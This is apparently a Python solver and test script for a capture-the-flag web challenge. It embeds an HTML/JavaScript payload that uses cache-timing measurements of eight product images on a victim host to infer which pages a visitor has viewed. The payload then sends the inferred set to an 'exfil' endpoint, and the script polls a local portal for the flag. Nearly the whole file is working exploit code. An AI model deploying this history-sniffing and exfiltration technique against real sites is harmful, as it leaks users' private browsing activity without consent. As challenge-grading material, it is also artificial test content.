#!/usr/bin/env python3
"""
Automated solver / test verification script for cache-medium (Hardened)
"""
import sys
import time
import requests

PORTAL_URL = "http://127.0.0.1:8000"

EXPLOIT_PAYLOAD = """<!DOCTYPE html>
<html>
<head>
  <title>Cache Medium Solver</title>
</head>
<body>
  <h1>Cache Visited Set Exploit</h1>
  <div id="log">Measuring multi-resource cache timings across 8 items...</div>
  <script>
    const jobId = new URLSearchParams(window.location.search).get('jobId');

    async function measureTime(url) {
      const t0 = performance.now();
      try {
        await fetch(url, { mode: 'no-cors', cache: 'force-cache' });
      } catch (e) {}
      return performance.now() - t0;
    }

    async function runExploit() {
      const log = document.getElementById('log');
      const ids = [1, 2, 3, 4, 5, 6, 7, 8];
      const results = [];

      for (const id of ids) {
        const url = `http://victim.ctf:3000/images/product-${id}.jpg`;
        const duration = await measureTime(url);
        console.log(`[Cache Probe] Product ${id} -> ${duration.toFixed(2)}ms`);
        results.push({ id, duration });
      }

      // Filter visited items (duration < 60ms)
      const visited = results.filter(r => r.duration < 60);
      const visitedIds = visited.map(r => r.id).sort().join(',');

      console.log('[Exploit] Identified visited set:', visitedIds);
      log.textContent = `Identified: ${visitedIds}. Exfiltrating...`;

      // Exfiltrate detected visited set with bound jobId
      await fetch('http://portal.ctf:8000/exfil?jobId=' + encodeURIComponent(jobId) + '&visited=' + encodeURIComponent(visitedIds));
    }

    window.addEventListener('DOMContentLoaded', runExploit);
  </script>
</body>
</html>
"""

def main():
    print(f"[*] Connecting to challenge portal at {PORTAL_URL}...")
    try:
        res = requests.post(
            f"{PORTAL_URL}/submit",
            json={"html": EXPLOIT_PAYLOAD},
            timeout=10
        )
        res.raise_for_status()
        data = res.json()
    except Exception as e:
        print(f"[-] Failed to submit exploit payload: {e}")
        sys.exit(1)

    job_id = data.get("jobId")
    print(f"[+] Exploit submitted successfully. Job ID: {job_id}")
    print("[*] Waiting for bot execution and cache set detection...")

    flag = None
    start_time = time.time()
    while time.time() - start_time < 20:
        time.sleep(1)
        try:
            status_res = requests.get(f"{PORTAL_URL}/status/{job_id}", timeout=5)
            status_data = status_res.json()
            if status_data.get("flag"):
                flag = status_data["flag"]
                break
            if status_data.get("status") == "completed" and not status_data.get("flag"):
                print("[-] Bot finished without successful flag release.")
                break
        except Exception as e:
            print(f"[!] Polling error: {e}")

    if flag:
        print(f"\n[+] SUCCESS! Captured flag: {flag}\n")
        assert flag.startswith("CTF{")
        sys.exit(0)
    else:
        print("[-] Exploit failed to recover the flag.")
        sys.exit(1)

if __name__ == "__main__":
    main()
